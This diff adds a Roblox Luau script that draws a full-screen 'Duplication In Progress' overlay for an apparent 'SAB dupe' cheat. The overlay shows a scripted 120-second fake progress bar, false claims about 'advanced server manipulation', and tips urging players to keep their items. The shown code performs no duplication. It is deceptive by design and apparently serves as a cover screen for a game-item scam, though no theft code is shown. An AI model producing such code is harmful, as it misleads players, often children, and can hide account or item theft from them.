@@ -1,0 +1,189 @@
+--!strict
+local Players = game:GetService("Players")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+-- Ensure default Roblox loading screen is skipped
+ReplicatedFirst:RemoveDefaultLoadingScreen()
+
+local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CustomLoadingScreen"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true -- Ensures full overlay (even leave menu)
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Main frame with gradient
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(1, 0, 1, 0)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+local Gradient = Instance.new("UIGradient")
+Gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(160, 0, 255)), -- top bright purple
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 0, 160)) -- bottom darker purple
+}
+Gradient.Rotation = 90
+Gradient.Parent = MainFrame
+
+-- Spinner container
+local SpinnerContainer = Instance.new("Frame")
+SpinnerContainer.Size = UDim2.new(0, 50, 0, 50)
+SpinnerContainer.Position = UDim2.new(0.2, 0, 0.35, 0)
+SpinnerContainer.BackgroundTransparency = 1
+SpinnerContainer.BorderSizePixel = 0
+SpinnerContainer.Parent = MainFrame
+
+local numDots = 12
+local dots = {}
+local dotRadius = 4
+local spinnerRadius = 20
+
+for i = 1, numDots do
+    local dot = Instance.new("Frame")
+    dot.Size = UDim2.new(0, dotRadius*2, 0, dotRadius*2)
+    dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    dot.BorderSizePixel = 0
+    dot.Parent = SpinnerContainer
+
+    local dotCorner = Instance.new("UICorner")
+    dotCorner.CornerRadius = UDim.new(0.5, 0)
+    dotCorner.Parent = dot
+
+    local angle = (i - 1) * (360 / numDots)
+    local x = math.cos(math.rad(angle)) * spinnerRadius
+    local y = math.sin(math.rad(angle)) * spinnerRadius
+    dot.Position = UDim2.new(0.5, x - dotRadius, 0.5, y - dotRadius)
+    dot.ZIndex = i
+    table.insert(dots, dot)
+end
+
+-- Spinner animation
+local function animateSpinner()
+    local dotTweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+    local function fadeDot(dotFrame, startTransparency, endTransparency)
+        local tween = TweenService:Create(dotFrame, dotTweenInfo, {BackgroundTransparency = endTransparency})
+        tween:Play()
+        return tween
+    end
+
+    local currentIndex = 1
+    while SpinnerContainer.Parent ~= nil do
+        local currentDot = dots[currentIndex]
+        local nextIndex = (currentIndex % numDots) + 1
+        local nextDot = dots[nextIndex]
+        fadeDot(currentDot, 0, 1)
+        fadeDot(nextDot, 1, 0)
+        currentIndex = nextIndex
+        task.wait(0.08)
+    end
+end
+task.spawn(animateSpinner)
+
+-- Duplication text
+local DuplicationText = Instance.new("TextLabel")
+DuplicationText.Size = UDim2.new(0.5, 0, 0.1, 0)
+DuplicationText.Position = UDim2.new(0.32, 0, 0.38, 0)
+DuplicationText.Text = "Duplication In Progress"
+DuplicationText.TextColor3 = Color3.fromRGB(255, 255, 255)
+DuplicationText.BackgroundTransparency = 1
+DuplicationText.Font = Enum.Font.FredokaOne
+DuplicationText.TextScaled = true
+DuplicationText.TextXAlignment = Enum.TextXAlignment.Left
+DuplicationText.Parent = MainFrame
+
+-- Progress bar frame with black outline
+local ProgressBarFrame = Instance.new("Frame")
+ProgressBarFrame.Size = UDim2.new(0.6, 0, 0.05, 0)
+ProgressBarFrame.Position = UDim2.new(0.2, 0, 0.6, 0)
+ProgressBarFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black outline
+ProgressBarFrame.BorderSizePixel = 0
+ProgressBarFrame.Parent = MainFrame
+
+local ProgressBarFill = Instance.new("Frame")
+ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
+ProgressBarFill.Position = UDim2.new(0, 1, 0, 1) -- slightly inset for outline
+ProgressBarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+ProgressBarFill.BorderSizePixel = 0
+ProgressBarFill.Parent = ProgressBarFrame
+
+local ProgressText = Instance.new("TextLabel")
+ProgressText.Size = UDim2.new(0.2, 0, 0.05, 0)
+ProgressText.Position = UDim2.new(0.4, 0, 0.53, 0)
+ProgressText.Text = "0.0%"
+ProgressText.TextColor3 = Color3.fromRGB(255, 255, 255)
+ProgressText.BackgroundTransparency = 1
+ProgressText.Font = Enum.Font.FredokaOne
+ProgressText.TextScaled = true
+ProgressText.Parent = MainFrame
+
+-- Entertainment content
+local entertainment = {
+    tips = {
+        "🎯 Fun Fact: 6 7",
+        "🚀 Did you know? This dupe method was discovered by accident",
+        "💎 Never trade your secrets before duping",
+        "🎪 Tung Tung Tung Sahur beats Lirili Larila",
+        "🌟 Dupe your secrets",
+    },
+    facts = {
+        "🧠 ZuriScripts birthday is 6/7🤣",
+        "🎲 This script is supported by Delta",
+        "⏰ This duplication process uses advanced server manipulation",
+        "🌍 ZuriScripts is Filipino 😲",
+        "🔢 The algorithm processes 1000+ calculations per second",
+        "🎯 Only 10% of people who play SAB knows about this",
+        "💻 This script contains over 1000+ lines of optimized code",
+        "🚀 This is the first working SAB dupe!",
+    }
+}
+
+local EntertainmentText = Instance.new("TextLabel")
+EntertainmentText.Size = UDim2.new(0.6, 0, 0.05, 0)
+EntertainmentText.Position = UDim2.new(0.2, 0, 0.7, 0)
+EntertainmentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+EntertainmentText.BackgroundTransparency = 1
+EntertainmentText.Font = Enum.Font.FredokaOne
+EntertainmentText.TextScaled = true
+EntertainmentText.TextWrapped = true
+EntertainmentText.Parent = MainFrame
+
+-- Cycle entertainment text
+local contentType = "tips"
+local contentIndex = 1
+task.spawn(function()
+    while ScreenGui.Parent do
+        local currentArray = entertainment[contentType]
+        EntertainmentText.Text = currentArray[contentIndex]
+        contentIndex = (contentIndex % #currentArray) + 1
+        contentType = (contentType == "tips") and "facts" or "tips"
+        task.wait(8)
+    end
+end)
+
+-- Progress bar easing (fast start, slow end)
+local function updateProgressBarEased(elapsed, total)
+    local t = math.clamp(elapsed / total, 0, 1)
+    local eased = 1 - math.pow(1 - t, 3)
+    local percent = eased * 100
+    ProgressBarFill:TweenSize(UDim2.new(percent / 100, -2, 1, -2), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, 0.1, true)
+    ProgressText.Text = string.format("%.1f%%", percent)
+end
+
+-- Simulate loading for 120 seconds
+local totalDuration = 120
+local startTime = tick()
+local connection
+connection = RunService.RenderStepped:Connect(function()
+    local elapsed = tick() - startTime
+    if elapsed >= totalDuration then
+        updateProgressBarEased(totalDuration, totalDuration)
+        connection:Disconnect()
+        DuplicationText.Text = "✅ Duplication Complete!"
+        return
+    end
+    updateProgressBarEased(elapsed, totalDuration)
+end)
